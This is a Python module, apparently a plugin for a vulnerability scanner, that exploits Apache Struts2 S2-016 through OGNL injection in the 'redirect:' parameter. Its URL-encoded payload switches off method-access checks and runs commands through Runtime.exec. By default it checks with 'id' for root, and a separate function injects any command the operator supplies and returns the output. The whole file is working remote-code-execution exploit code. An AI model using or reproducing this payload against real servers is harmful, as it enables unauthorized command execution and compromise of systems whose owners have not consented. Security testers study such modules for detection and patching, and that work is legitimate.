import requests
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import hashlib
import urllib

cdd=''
http = ''
https = ''
cmd=''
dq1=''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd,dq1
    global http, https,cmd
    try:
        proxies = {'http': http,
                   'https': https}
        if cmd!='':
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc1 = "redirect%3A%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27CMD%27%29.getInputStream%28%29%29%7D"
            poc2=poc1.replace('CMD',cmd)
            aa = requests.get(url1,data=poc2, headers=headers, proxies=proxies, verify=False, timeout=15,cookies=s_cookie)
            cdd = str(aa.headers)+'\n'+str(aa.text)
            cmd=''
        else:
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc = "redirect%3A%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D"
            aa = requests.post(url1,data=poc, headers=headers, proxies=proxies, verify=False, timeout=15,cookies=s_cookie)
            if 'groups=0' in aa.text or 'groups=0' in aa.headers:
                cdd = '[+]漏洞存在\n执行命令：id\n匹配关键词：groups=0\n'+str(aa.headers)+'\n'+str(aa.text)
            else:
                cdd = '[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ S2-016 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
def cmad(cmd1):
    global cmd
    cmd=cmd1